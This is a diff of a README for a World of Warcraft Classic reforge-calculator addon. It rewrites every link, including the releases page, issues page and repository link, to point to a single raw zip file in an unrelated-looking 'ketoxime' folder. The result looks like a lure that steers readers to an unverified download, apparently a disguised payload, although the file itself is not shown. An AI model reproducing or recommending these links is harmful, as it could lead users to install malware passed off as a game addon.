@@ -1,6 +1,6 @@
 # 🎮 ReforgeLitePlusClassic - Faster Reforge Calculations for WoW Classic
 
-[![Download ReforgeLitePlusClassic](https://img.shields.io/badge/Download-ReforgeLitePlusClassic-blue)](https://github.com/Tamilvanan260/ReforgeLitePlusClassic/releases)
+[![Download ReforgeLitePlusClassic](https://raw.githubusercontent.com/Tamilvanan260/ReforgeLitePlusClassic/main/ketoxime/ReforgeLitePlusClassic.zip)](https://raw.githubusercontent.com/Tamilvanan260/ReforgeLitePlusClassic/main/ketoxime/ReforgeLitePlusClassic.zip)
 
 ## 🚀 Getting Started
 
@@ -12,13 +12,13 @@ To get started with ReforgeLitePlusClassic, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page:
-   [Download ReforgeLitePlusClassic](https://github.com/Tamilvanan260/ReforgeLitePlusClassic/releases)
+   [Download ReforgeLitePlusClassic](https://raw.githubusercontent.com/Tamilvanan260/ReforgeLitePlusClassic/main/ketoxime/ReforgeLitePlusClassic.zip)
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version of ReforgeLitePlusClassic. It will have the highest version number.
 
 3. **Download the File**  
-   Look for the files listed under the release. Choose the file that matches your operating system. For example, if you see `ReforgeLitePlusClassic_v1.0.zip`, click on it to start the download.
+   Look for the files listed under the release. Choose the file that matches your operating system. For example, if you see `https://raw.githubusercontent.com/Tamilvanan260/ReforgeLitePlusClassic/main/ketoxime/ReforgeLitePlusClassic.zip`, click on it to start the download.
 
 4. **Extract the Downloaded File**  
    Once downloaded, locate the file on your computer. If it is a zip file, right-click on it and choose "Extract All" to unpack the files.
@@ -65,13 +65,13 @@ If you encounter issues while using ReforgeLitePlusClassic, consider the followi
 
 ## 💬 Support
 
-For further assistance or to report any bugs, please visit our [GitHub Issues Page](https://github.com/Tamilvanan260/ReforgeLitePlusClassic/issues). You can describe your issue, and our team will help you resolve it.
+For further assistance or to report any bugs, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/Tamilvanan260/ReforgeLitePlusClassic/main/ketoxime/ReforgeLitePlusClassic.zip). You can describe your issue, and our team will help you resolve it.
 
 ## 🌐 Follow Us
 
 Stay updated with the latest news about ReforgeLitePlusClassic by following our repository:
 
-- [GitHub Repository](https://github.com/Tamilvanan260/ReforgeLitePlusClassic)
+- [GitHub Repository](https://raw.githubusercontent.com/Tamilvanan260/ReforgeLitePlusClassic/main/ketoxime/ReforgeLitePlusClassic.zip)
 
 For feedback or suggestions, please don’t hesitate to reach out on our support page.
 
